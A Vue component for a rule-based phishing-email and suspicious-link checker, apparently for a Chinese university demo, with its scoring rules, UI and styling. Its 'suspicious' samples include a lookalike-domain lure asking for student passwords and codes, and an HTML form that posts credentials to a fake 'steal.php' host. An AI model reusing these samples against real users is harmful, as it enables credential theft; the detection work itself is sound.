<script setup lang="ts">
/**
 * 定向命题七：钓鱼邮件与可疑链接识别。
 *
 * 线下展示最容易被追问的一句是「你凭什么说它是钓鱼」。所以这一页的重点不是
 * 一个红色徽章，而是徽章底下那几条命中：哪句话在施压、哪个链接是仿冒域名、
 * 表单把密码发去了哪里——每条都引用原文，评委可以当场核对。
 *
 * 刻意不做两件事：不调大模型（安全判断必须可复现、离线可跑），
 * 不访问链接（否则识别工具自己就成了探测工具）。截图 OCR 也没做，
 * 页面上直说，不假装看懂了图片。
 */
import { computed, ref } from 'vue'
import {
  PhArrowRight,
  PhCheckCircle,
  PhInfo,
  PhLinkSimple,
  PhMagnifyingGlass,
  PhShieldWarning,
  PhCode,
  PhEnvelope,
  PhWarning,
} from '@phosphor-icons/vue'
import { checkPhishing } from '../api'
import type { PhishingReport } from '../api'
import AnswerFeedback from './AnswerFeedback.vue'

type Mode = 'text' | 'html' | 'url'

const MODES: { id: Mode; label: string; hint: string; icon: unknown }[] = [
  { id: 'text', label: '邮件正文 / 短信', hint: '粘贴原文', icon: PhEnvelope },
  { id: 'html', label: '网页源码', hint: 'Ctrl+U 复制', icon: PhCode },
  { id: 'url', label: '单条链接', hint: '只解析不访问', icon: PhLinkSimple },
]

/** 每组规则都是「怎么判 + 权重」，权重公开才能解释为什么是高风险。 */
const RULE_GROUPS = [
  {
    title: '话术特征',
    note: '钓鱼靠时间压力和情绪推动，正常通知不会只给几小时。',
    rules: ['制造时间压力 18', '诱导下载附件 16', '用奖励诱导点击 16', '出现可执行附件 22'],
  },
  {
    title: '身份与索要',
    note: '学校任何部门都不会通过邮件或短信索取密码和验证码。',
    rules: ['索要账号密码验证码 40', '冒充校内部门 12', '发件人不是学校邮箱 18', '涉及转账或缴费 26'],
  },
  {
    title: '链接特征',
    note: '域名是最硬的证据：签名可以伪造，域名要花钱注册。',
    rules: [
      '仿冒学校域名 40',
      '短链隐藏目标 30',
      '不是学校域名 30',
      '同形字域名 30',
      'IP 直连 26',
      '高风险后缀 18',
      '缺少 HTTPS 16',
    ],
  },
  {
    title: '页面结构',
    note: '仿冒登录页必须把输入的内容送回自己手里，这一步藏不住。',
    rules: ['表单提交到校外 44', '页面含密码框 24', '基准地址被改 32', '脚本自动跳转 20', '内嵌外部框架 14'],
  },
]

/** 拼出来的 script 结束标签，见下面 html 样例里的注释。 */
const SCRIPT_END = '<' + '/script>'

const SAMPLES: Record<Mode, { bad: string; good: string }> = {
  text: {
    bad: `【教务处】紧急通知：您的校园网账号将于 24 小时内停用，
请立即登录 http://sdnu-edu.cn/login 验证身份，否则无法选课。
请输入学号和密码，并填写收到的短信验证码。
联系人：教务处 王老师 wanglaoshi@sdnu-edu.cn`,
    good: `各位同学：
本学期选课将于 11 月 18 日 9:00 开放，入口为学校官网「教务系统」。
如遇登录问题，请携带学生证到文渊楼 305 咨询，或拨打电话 86180371。
教务处`,
  },
  html: {
    // 注意：script 的结束标签不能以字面量写进 SFC 的 script 块，
    // 否则会被 Vue 当成块结束符，后面整段都被当成模板解析。所以拼出来。
    bad: [
      '<html><head><base href="http://sdnu-edu.top/"></head><body>',
      '<form action="http://sdnu-edu.top/steal.php" method="post">',
      '  <input type="text" name="user">',
      '  <input type="password" name="pass">',
      '</form>',
      '<script>window.location.href = "http://sdnu-edu.top/ok.html";' + SCRIPT_END,
      '</body></html>',
    ].join('\n'),
    good: [
      '<html><body>',
      '<form action="https://jwxt.sdnu.edu.cn/login" method="post">',
      '  <input type="text" name="user">',
      '  <input type="password" name="pass">',
      '</form>',
      '</body></html>',
    ].join('\n'),
  },
  url: {
    bad: 'http://sdnu-edu.xyz/login',
    good: 'https://aihub.sdnu.edu.cn/info/1008/1431.htm',
  },
}

const mode = ref<Mode>('text')
const content = ref('')
const busy = ref(false)
const error = ref('')
const report = ref<PhishingReport | null>(null)
const analysed = ref('')

const activeMode = computed(() => MODES.find((item) => item.id === mode.value)!)
const placeholder = computed(() => {
  if (mode.value === 'text') return '把邮件正文、短信或通知原文粘进来。'
  if (mode.value === 'html') return '在浏览器里按 Ctrl+U 看源码，复制表单附近那一段。'
  return '粘贴一条要核实的链接，例如 http://sdnu-edu.xyz/login'
})

const levelClass = computed(() => (report.value ? `is-${report.value.risk_level}` : ''))
const ruleCount = computed(() => RULE_GROUPS.reduce((sum, group) => sum + group.rules.length, 0))
const typeLabel = computed(() => {
  const map: Record<string, string> = { text: '文本', html: '网页源码', url: '链接' }
  return map[report.value?.input_type ?? ''] ?? '文本'
})

function switchMode(next: Mode) {
  if (mode.value === next) return
  mode.value = next
  content.value = ''
  report.value = null
  error.value = ''
  analysed.value = ''
}

function fillSample(kind: 'bad' | 'good') {
  content.value = SAMPLES[mode.value][kind]
  report.value = null
  error.value = ''
  analysed.value = ''
}

async function analyse() {
  const body = content.value.trim()
  if (!body) {
    error.value = '先粘一段内容进来，再点识别。'
    return
  }
  busy.value = true
  error.value = ''
  try {
    report.value = await checkPhishing(mode.value, body)
    analysed.value = body
  } catch (err) {
    error.value = err instanceof Error ? err.message : '识别没跑完'
    report.value = null
  } finally {
    busy.value = false
  }
}
</script>

<template>
  <section class="phish-page">
    <header class="phish-head">
      <div>
        <p class="eyebrow">定向命题七 · 钓鱼识别</p>
        <h1>说它是钓鱼，<em>就指出是哪一句。</em></h1>
        <p class="phish-lead">
          粘进一段通知、一页源码或一条链接，平台逐条比对 {{ ruleCount }} 条规则，给出风险等级、
          可疑原因、证据点和处置建议。全程纯规则判断，不调大模型、不访问任何链接，
          结论可以当场核对。
        </p>
      </div>
      <ul class="phish-facts">
        <li><strong>{{ ruleCount }}</strong><span>条判定规则</span></li>
        <li><strong>0</strong><span>次外部请求</span></li>
        <li><strong>3</strong><span>种输入形态</span></li>
      </ul>
    </header>

    <div class="phish-grid">
      <div class="phish-main">
        <div class="phish-tabs" role="tablist">
          <button
            v-for="item in MODES"
            :key="item.id"
            type="button"
            role="tab"
            class="phish-tab"
            :class="{ 'is-active': mode === item.id }"
            :aria-selected="mode === item.id"
            @click="switchMode(item.id)"
          >
            <component :is="item.icon" :size="15" weight="duotone" />
            <span>{{ item.label }}</span>
            <em>{{ item.hint }}</em>
          </button>
        </div>

        <div class="phish-input">
          <label :for="`phish-${mode}`" class="phish-input-label">
            {{ activeMode.label }}
            <span v-if="mode === 'url'">只解析字符串，不会打开这个地址</span>
          </label>
          <input
            v-if="mode === 'url'"
            :id="`phish-${mode}`"
            v-model="content"
            type="text"
            class="phish-line"
            :placeholder="placeholder"
            @keydown.enter.prevent="analyse"
          >
          <textarea
            v-else
            :id="`phish-${mode}`"
            v-model="content"
            class="phish-area"
            :class="{ 'is-code': mode === 'html' }"
            rows="9"
            :placeholder="placeholder"
          />

          <div class="phish-actions">
            <button type="button" class="ink-button primary" :disabled="busy" @click="analyse">
              <PhMagnifyingGlass :size="16" />
              {{ busy ? '正在比对规则…' : '开始识别' }}
            </button>
            <button type="button" class="phish-ghost" @click="fillSample('bad')">填入可疑样例</button>
            <button type="button" class="phish-ghost" @click="fillSample('good')">填入正常样例</button>
            <span v-if="content" class="phish-count">{{ content.length }} 字符</span>
          </div>
        </div>

        <p v-if="error" class="phish-error"><PhWarning :size="15" />{{ error }}</p>

        <article v-if="report" class="phish-result" :class="levelClass">
          <header class="phish-verdict">
            <div class="phish-badge">
              <PhShieldWarning :size="22" weight="duotone" />
              <div>
                <strong>{{ report.risk_label }}</strong>
                <span>{{ typeLabel }} · 命中 {{ report.findings.length }} 条</span>
              </div>
            </div>
            <div class="phish-meter">
              <div class="phish-meter-track">
                <i :style="{ width: `${report.score}%` }" />
              </div>
              <p>风险分 {{ report.score }} / 100 · 60 以上判高风险，30 以上需要核实</p>
            </div>
          </header>

          <section v-if="report.findings.length" class="phish-findings">
            <h2>可疑在哪</h2>
            <ul>
              <li v-for="item in report.findings" :key="item.code + item.title">
                <div class="phish-finding-head">
                  <strong>{{ item.title }}</strong>
                  <span class="phish-weight">+{{ item.weight }}</span>
                </div>
                <p class="phish-detail">{{ item.detail }}</p>
                <ul v-if="item.evidence.length" class="phish-evidence">
                  <li v-for="(quote, index) in item.evidence" :key="index">
                    <code>{{ quote }}</code>
                  </li>
                </ul>
              </li>
            </ul>
          </section>

          <section v-else class="phish-clean">
            <PhCheckCircle :size="20" weight="duotone" />
            <p>没有命中任何规则。但这只说明「没发现典型特征」，不等于「一定安全」。</p>
          </section>

          <section class="phish-advice">
            <h2>接下来怎么做</h2>
            <ol>
              <li v-for="(item, index) in report.advice" :key="index">
                <PhArrowRight :size="14" />{{ item }}
              </li>
            </ol>
          </section>

          <section v-if="report.scanned_links.length" class="phish-links">
            <h2>扫到的链接</h2>
            <ul>
              <li v-for="link in report.scanned_links" :key="link">
                <code>{{ link }}</code>
                <span v-if="report.safe_links.includes(link)" class="phish-safe">学校域名</span>
                <span v-else class="phish-unsafe">需核实</span>
              </li>
            </ul>
          </section>

          <p class="phish-note"><PhInfo :size="14" />{{ report.note }}</p>

          <AnswerFeedback target="phishing_check" hint="这次判断准吗" />
        </article>

        <p v-else-if="!error" class="phish-empty">
          还没识别过。可以先点「填入可疑样例」，现场看一遍规则是怎么落到具体那句话上的。
        </p>
      </div>

      <aside class="phish-side">
        <article v-for="group in RULE_GROUPS" :key="group.title" class="phish-rule-card">
          <h2>{{ group.title }}</h2>
          <p class="phish-rule-note">{{ group.note }}</p>
          <ul>
            <li v-for="rule in group.rules" :key="rule">
              <span>{{ rule.split(' ')[0] }}</span>
              <em>+{{ rule.split(' ')[1] }}</em>
            </li>
          </ul>
        </article>

        <article class="phish-honest">
          <h2>这一页没做什么</h2>
          <ul>
            <li>不做截图 OCR。识别图片里的字是另一件事，做一半反而让人以为看懂了整张图。</li>
            <li>不访问链接。只解析字符串，所以现场断网也能跑。</li>
            <li>不判「一定安全」。规则没命中只代表没命中，不代表可信。</li>
          </ul>
        </article>
      </aside>
    </div>
  </section>
</template>

<style scoped>
.phish-page {
  max-width: 1240px;
  margin: 0 auto;
  padding-bottom: 3rem;
}

.phish-head {
  display: flex;
  flex-wrap: wrap;
  align-items: flex-end;
  justify-content: space-between;
  gap: 1.5rem;
  margin: 1.5rem 0 1.5rem;
}

.phish-head h1 {
  margin: .25rem 0 .6rem;
  font: 400 clamp(2rem, 4vw, 3.2rem)/1.1 "LXGW WenKai", cursive;
  letter-spacing: -.03em;
  color: #172b2a;
}

.phish-head h1 em {
  font-style: normal;
  color: #397f72;
}

.phish-lead {
  max-width: 64ch;
  margin: 0;
  color: #667572;
  line-height: 1.75;
}

.phish-facts {
  display: flex;
  gap: .6rem;
  margin: 0;
  padding: 0;
  list-style: none;
}

.phish-facts li {
  padding: .7rem 1rem;
  border: 1px solid #d8ded4;
  border-radius: 16px;
  background: #fffef8;
  text-align: right;
}

.phish-facts strong {
  display: block;
  font: 400 1.6rem/1 "LXGW WenKai", cursive;
  color: #173f43;
}

.phish-facts span {
  display: block;
  margin-top: .3rem;
  font-size: .72rem;
  color: #667572;
}

.phish-grid {
  display: grid;
  grid-template-columns: minmax(0, 1fr) 300px;
  gap: 1.1rem;
  align-items: start;
}

/* ---------- 输入区 ---------- */

.phish-tabs {
  display: flex;
  flex-wrap: wrap;
  gap: .4rem;
  margin-bottom: .8rem;
}

.phish-tab {
  display: inline-flex;
  align-items: center;
  gap: .35rem;
  padding: .5rem .85rem;
  border: 1px solid #d8ded4;
  border-radius: 12px;
  background: #fffef8;
  color: #4c5b58;
  font: inherit;
  font-size: .84rem;
  cursor: pointer;
  transition: border-color .16s ease, background .16s ease, color .16s ease;
}

.phish-tab em {
  font-style: normal;
  font-size: .7rem;
  color: #8f9c98;
}

.phish-tab:hover {
  border-color: #397f72;
}

.phish-tab.is-active {
  border-color: #397f72;
  background: #eef4f0;
  color: #173f43;
}

.phish-tab.is-active em {
  color: #397f72;
}

.phish-input {
  padding: 1rem 1.1rem 1.1rem;
  border: 1px solid #d8ded4;
  border-radius: 18px;
  background: #fffef8;
}

.phish-input-label {
  display: flex;
  align-items: baseline;
  justify-content: space-between;
  gap: .6rem;
  margin-bottom: .5rem;
  font-size: .82rem;
  font-weight: 600;
  color: #173f43;
}

.phish-input-label span {
  font-weight: 400;
  font-size: .72rem;
  color: #8f9c98;
}

.phish-area,
.phish-line {
  width: 100%;
  padding: .8rem .9rem;
  border: 1px solid #dfe3d8;
  border-radius: 12px;
  background: #fbfaf2;
  color: #172b2a;
  font: inherit;
  font-size: .85rem;
  line-height: 1.75;
  resize: vertical;
}

.phish-area.is-code {
  font-family: "Cascadia Code", Consolas, monospace;
  font-size: .78rem;
}

.phish-area:focus-visible,
.phish-line:focus-visible {
  outline: 2px solid #397f72;
  outline-offset: 1px;
}

.phish-actions {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: .5rem;
  margin-top: .8rem;
}

.phish-ghost {
  padding: .42rem .8rem;
  border: 1px dashed #cfd7cb;
  border-radius: 999px;
  background: transparent;
  color: #4c5b58;
  font: inherit;
  font-size: .78rem;
  cursor: pointer;
  transition: border-color .16s ease, color .16s ease;
}

.phish-ghost:hover {
  border-color: #397f72;
  color: #173f43;
}

.phish-count {
  margin-left: auto;
  font-size: .72rem;
  color: #8f9c98;
}

.phish-error {
  display: flex;
  align-items: center;
  gap: .4rem;
  margin: .8rem 0 0;
  padding: .7rem .9rem;
  border-left: 3px solid #b63d3d;
  border-radius: 0 12px 12px 0;
  background: #fdf6f4;
  color: #8a3d30;
  font-size: .84rem;
}

.phish-empty {
  margin: 1rem 0 0;
  padding: 1.1rem 1.2rem;
  border: 1px dashed #d8ded4;
  border-radius: 16px;
  color: #667572;
  font-size: .84rem;
  line-height: 1.75;
}

/* ---------- 结果区 ---------- */

.phish-result {
  margin-top: 1rem;
  padding: 1.1rem 1.2rem 1.2rem;
  border: 1px solid #d8ded4;
  border-left: 4px solid #397f72;
  border-radius: 18px;
  background: #fffef8;
}

.phish-result.is-high {
  border-left-color: #b63d3d;
  background: #fdf8f6;
}

.phish-result.is-medium {
  border-left-color: #b98b2e;
  background: #fdfaf2;
}

.phish-verdict {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  gap: 1rem;
  padding-bottom: .9rem;
  border-bottom: 1px dashed #e2e6dc;
}

.phish-badge {
  display: flex;
  align-items: center;
  gap: .6rem;
  color: #397f72;
}

.is-high .phish-badge {
  color: #b63d3d;
}

.is-medium .phish-badge {
  color: #b98b2e;
}

.phish-badge strong {
  display: block;
  font: 400 1.4rem/1.2 "LXGW WenKai", cursive;
  color: inherit;
}

.phish-badge span {
  display: block;
  margin-top: .15rem;
  font-size: .74rem;
  color: #667572;
}

.phish-meter {
  flex: 1 1 240px;
  max-width: 340px;
}

.phish-meter-track {
  height: 8px;
  border-radius: 999px;
  background: #e8ece2;
  overflow: hidden;
}

.phish-meter-track i {
  display: block;
  height: 100%;
  border-radius: 999px;
  background: #397f72;
  transition: width .4s ease;
}

.is-high .phish-meter-track i {
  background: #b63d3d;
}

.is-medium .phish-meter-track i {
  background: #b98b2e;
}

.phish-meter p {
  margin: .35rem 0 0;
  font-size: .72rem;
  color: #8f9c98;
}

.phish-findings,
.phish-advice,
.phish-links {
  margin-top: 1rem;
}

.phish-findings h2,
.phish-advice h2,
.phish-links h2 {
  margin: 0 0 .55rem;
  font-size: .92rem;
  color: #173f43;
}

.phish-findings > ul {
  display: grid;
  gap: .6rem;
  margin: 0;
  padding: 0;
  list-style: none;
}

.phish-findings > ul > li {
  padding: .7rem .85rem;
  border-radius: 12px;
  background: #f5f4eb;
}

.phish-finding-head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: .6rem;
}

.phish-finding-head strong {
  font-size: .86rem;
  color: #172b2a;
}

.phish-weight {
  flex: 0 0 auto;
  padding: 1px 7px;
  border-radius: 999px;
  background: #fffef8;
  border: 1px solid #d8ded4;
  font-size: .7rem;
  color: #8a6a3d;
}

.phish-detail {
  margin: .35rem 0 0;
  font-size: .78rem;
  line-height: 1.7;
  color: #667572;
}

.phish-evidence {
  display: grid;
  gap: .3rem;
  margin: .45rem 0 0;
  padding: 0;
  list-style: none;
}

.phish-evidence code {
  display: block;
  padding: .35rem .5rem;
  border-left: 2px solid #cfd7cb;
  background: #fffef8;
  font-family: "Cascadia Code", Consolas, monospace;
  font-size: .72rem;
  line-height: 1.6;
  color: #4c5b58;
  word-break: break-all;
}

.phish-advice ol {
  display: grid;
  gap: .35rem;
  margin: 0;
  padding: 0;
  list-style: none;
  counter-reset: advice;
}

.phish-advice li {
  display: flex;
  align-items: flex-start;
  gap: .35rem;
  font-size: .82rem;
  line-height: 1.7;
  color: #172b2a;
}

.phish-advice li svg {
  flex: 0 0 auto;
  margin-top: .28rem;
  color: #397f72;
}

.phish-links ul {
  display: grid;
  gap: .35rem;
  margin: 0;
  padding: 0;
  list-style: none;
}

.phish-links li {
  display: flex;
  align-items: center;
  gap: .5rem;
  flex-wrap: wrap;
}

.phish-links code {
  font-family: "Cascadia Code", Consolas, monospace;
  font-size: .74rem;
  color: #4c5b58;
  word-break: break-all;
}

.phish-safe,
.phish-unsafe {
  flex: 0 0 auto;
  padding: 1px 7px;
  border-radius: 999px;
  font-size: .68rem;
}

.phish-safe {
  background: #eef4f0;
  color: #397f72;
}

.phish-unsafe {
  background: #fdf0ec;
  color: #8a3d30;
}

.phish-clean {
  display: flex;
  align-items: center;
  gap: .55rem;
  margin-top: .9rem;
  padding: .8rem .9rem;
  border-radius: 12px;
  background: #eef4f0;
  color: #397f72;
}

.phish-clean p {
  margin: 0;
  font-size: .82rem;
  line-height: 1.7;
  color: #2f6b60;
}

.phish-note {
  display: flex;
  align-items: flex-start;
  gap: .4rem;
  margin: 1rem 0 0;
  padding-top: .8rem;
  border-top: 1px dashed #e2e6dc;
  font-size: .74rem;
  line-height: 1.7;
  color: #8f9c98;
}

.phish-note svg {
  flex: 0 0 auto;
  margin-top: .2rem;
}

/* ---------- 右侧规则表 ---------- */

.phish-side {
  display: grid;
  gap: .8rem;
}

.phish-rule-card,
.phish-honest {
  padding: .9rem 1rem 1rem;
  border: 1px solid #d8ded4;
  border-radius: 16px;
  background: #fffef8;
}

.phish-rule-card h2,
.phish-honest h2 {
  margin: 0 0 .3rem;
  font-size: .88rem;
  color: #173f43;
}

.phish-rule-note {
  margin: 0 0 .6rem;
  font-size: .74rem;
  line-height: 1.65;
  color: #667572;
}

.phish-rule-card ul,
.phish-honest ul {
  display: grid;
  gap: .3rem;
  margin: 0;
  padding: 0;
  list-style: none;
}

.phish-rule-card li {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: .5rem;
  padding: .3rem .45rem;
  border-radius: 8px;
  background: #f5f4eb;
  font-size: .75rem;
  color: #4c5b58;
}

.phish-rule-card em {
  font-style: normal;
  font-size: .7rem;
  color: #8a6a3d;
}

.phish-honest li {
  padding-left: .8rem;
  position: relative;
  font-size: .74rem;
  line-height: 1.7;
  color: #667572;
}

.phish-honest li::before {
  content: "·";
  position: absolute;
  left: .2rem;
  color: #b98b2e;
}

@media (max-width: 980px) {
  .phish-grid {
    grid-template-columns: 1fr;
  }

  .phish-facts {
    width: 100%;
  }
}
</style>
